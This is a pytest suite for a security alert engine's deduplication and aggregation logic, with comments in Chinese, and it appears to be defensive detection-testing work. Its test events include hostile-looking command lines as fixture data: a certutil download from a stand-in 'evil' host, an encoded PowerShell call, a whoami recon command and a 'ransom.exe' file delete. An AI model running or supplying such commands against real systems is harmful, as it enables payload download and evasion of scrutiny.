"""阶段三（聚合稳定性）测试套件 — AlertEngine 去重/幂等，防 daemon 高频进程流告警风暴.

覆盖范围：
- 修复：daemon 推送 event_type='process_start'，原 evaluate_events 仅匹配
  process_create/term/network/file，导致 daemon 进程流**零告警**；进程专用评估器
  (evaluate_process_event) 此前是死代码。现 evaluate_events 对进程类事件统一走
  evaluate_process_event（命令级检测 + create_or_aggregate 5 分钟聚合）。
- 去重/幂等：同一规则、同一主机、5 分钟内重复事件 → 单条告警 count 累加，不新增告警；
  高频流（100 次）不触发告警风暴；不同可疑命令各自独立告警但各自聚合。
- 通用事件（network/file）仍走通用评估路径。
- 聚类：keyword 模式对相同告警输入产出稳定分组（确定性）。

DB 隔离：module-scoped 临时 SQLite，init_db 仅建库一次；每用例前清空被测表。
"""

import sys
import uuid
import tempfile
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parent.parent
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from app.config import settings  # noqa: E402
from app.database import init_db, get_connection  # noqa: E402

_TABLES_TO_CLEAR = ["alerts", "hosts", "cases"]


def _clear_data() -> None:
    with get_connection() as conn:
        conn.execute("PRAGMA foreign_keys = OFF")
        for t in _TABLES_TO_CLEAR:
            try:
                conn.execute(f"DELETE FROM {t}")
            except Exception:
                pass
        conn.execute("PRAGMA foreign_keys = ON")


@pytest.fixture(scope="module")
def env():
    original = settings.DB_PATH
    original_jm = getattr(settings, "DB_JOURNAL_MODE", "WAL")
    tmp_dir = tempfile.mkdtemp(prefix="phase3_")
    db_path = str(Path(tmp_dir) / "test.db")
    settings.DB_PATH = db_path
    settings.DB_JOURNAL_MODE = "DELETE"
    init_db()
    ctx = {"db_path": db_path, "tmp_dir": tmp_dir}
    yield ctx
    settings.DB_PATH = original
    settings.DB_JOURNAL_MODE = original_jm
    import shutil
    shutil.rmtree(tmp_dir, ignore_errors=True)


@pytest.fixture()
def client(env):
    _clear_data()
    yield None


def seed_host(status="imported", hostname="hostAgg") -> int:
    with get_connection() as conn:
        cur = conn.execute(
            "INSERT INTO cases (name) VALUES (?)", [f"QA-{uuid.uuid4().hex[:8]}"]
        )
        case_id = int(cur.lastrowid)
        cur = conn.execute(
            "INSERT INTO hosts (case_id, hostname, status) VALUES (?, ?, ?)",
            [case_id, hostname, status],
        )
        return int(cur.lastrowid)


def _engine():
    from app.services.alert_engine import AlertEngine
    return AlertEngine()


def _alert_names(host_id):
    from app.models.alert import Alert
    return [a["rule_name"] for a in Alert.list(host_id=host_id)]


def _count_of(host_id, rule_name):
    from app.models.alert import Alert
    for a in Alert.list(host_id=host_id):
        if a["rule_name"] == rule_name:
            return a["count"]
    return 0


# ============================================================================
# 1) daemon 进程流现在真正进入评估（修复验证）
# ============================================================================

def test_daemon_process_start_now_alerts(client):
    """回归：此前 process_start 不匹配 _EVENT_RULES → 零告警；修复后应产出告警。"""
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 1, "process_name": "svchost.exe",
          "command_line": "svchost.exe -k netsvcs"}
    eng.evaluate_events(host_id, [ev])
    assert "EVENT-PROCESS-ROUTINE" in _alert_names(host_id), \
        "daemon process_start 应经进程专用评估产出告警"


# ============================================================================
# 2) 去重 / 幂等（防告警风暴）
# ============================================================================

def test_benign_process_stream_aggregates(client):
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 1, "process_name": "svchost.exe",
          "command_line": "svchost.exe -k netsvcs"}
    for _ in range(20):
        eng.evaluate_events(host_id, [ev])
    alerts = [a for a in _alert_names(host_id)]
    routine = [n for n in alerts if n == "EVENT-PROCESS-ROUTINE"]
    assert len(routine) == 1, "20 次相同良性进程应聚合为 1 条告警"
    assert _count_of(host_id, "EVENT-PROCESS-ROUTINE") == 20


def test_suspicious_certutil_stream_aggregates_no_storm(client):
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 2, "process_name": "certutil.exe",
          "command_line": "certutil.exe -urlcache -split https://evil/x"}
    for _ in range(50):
        eng.evaluate_events(host_id, [ev])
    cert = [n for n in _alert_names(host_id) if n == "EVENT-CERTUTIL-DOWNLOAD"]
    assert len(cert) == 1, "50 次相同 certutil 下载应聚合为 1 条（非 50 条风暴）"
    assert _count_of(host_id, "EVENT-CERTUTIL-DOWNLOAD") == 50


def test_high_frequency_stream_exact_single_alert(client):
    """模拟 daemon 5s 一次的超高频良性进程流（100 次）不触发告警风暴。"""
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 3, "process_name": "explorer.exe",
          "command_line": "explorer.exe"}
    for _ in range(100):
        eng.evaluate_events(host_id, [ev])
    from app.models.alert import Alert
    all_alerts = Alert.list(host_id=host_id)
    routine = [a for a in all_alerts if a["rule_name"] == "EVENT-PROCESS-ROUTINE"]
    assert len(routine) == 1
    assert routine[0]["count"] == 100
    # 整个主机告警条数应仅为 1（良性全部聚合）
    assert len(all_alerts) == 1


def test_distinct_suspicious_commands_separate_but_aggregated(client):
    host_id = seed_host()
    eng = _engine()
    eng.evaluate_events(host_id, [
        {"event_type": "process_start", "pid": 4, "process_name": "certutil.exe",
         "command_line": "certutil -urlcache -split a"},
        {"event_type": "process_start", "pid": 5, "process_name": "powershell.exe",
         "command_line": "powershell -enc ABCD"},
    ])
    names = set(_alert_names(host_id))
    assert "EVENT-CERTUTIL-DOWNLOAD" in names
    assert "EVENT-PS-ENCODED" in names
    # 两条不同可疑命令应各自独立（不被错误合并）
    assert len([n for n in names if n in ("EVENT-CERTUTIL-DOWNLOAD", "EVENT-PS-ENCODED")]) == 2


def test_repeated_evaluate_idempotent_no_new_alert(client):
    """同一事件重复评估（窗口内）不新增告警，仅 count+1。"""
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 9, "process_name": "cmd.exe",
          "command_line": "whoami"}
    eng.evaluate_events(host_id, [ev])          # 首评 → EVENT-RECON
    before = len(_alert_names(host_id))
    eng.evaluate_events(host_id, [ev])          # 重复 → 聚合
    after = len(_alert_names(host_id))
    assert after == before, "重复评估不应新增告警"
    assert _count_of(host_id, "EVENT-RECON") == 2


# ============================================================================
# 3) 通用事件路径不受影响
# ============================================================================

def test_generic_network_event_still_alerts(client):
    host_id = seed_host()
    eng = _engine()
    eng.evaluate_events(host_id, [
        {"event_type": "network_connect", "remote_address": "1.2.3.4",
         "process_name": "x", "pid": 1}
    ])
    assert "EVENT-NET-CONNECT" in _alert_names(host_id), \
        "非进程类事件仍走通用评估路径"


def test_generic_file_delete_alerts(client):
    host_id = seed_host()
    eng = _engine()
    eng.evaluate_events(host_id, [
        {"event_type": "file_delete", "process_name": "ransom.exe", "pid": 1}
    ])
    assert "EVENT-FILE-DELETE" in _alert_names(host_id)


# ============================================================================
# 4) 聚类确定性（events 维度稳定）
# ============================================================================

def test_keyword_cluster_deterministic(client):
    host_id = seed_host()
    eng = _engine()
    ev = {"event_type": "process_start", "pid": 1, "process_name": "certutil.exe",
          "command_line": "certutil -urlcache -split a"}
    for _ in range(3):
        eng.evaluate_events(host_id, [ev])
    from app.models.alert import Alert
    from app.services.incident_correlator import IncidentCorrelator
    alerts = Alert.list(host_id=host_id)
    corr = IncidentCorrelator()
    g1 = corr._cluster_keyword(alerts)
    g2 = corr._cluster_keyword(alerts)
    assert g1 == g2, "相同告警输入应产出确定性的聚类分组"
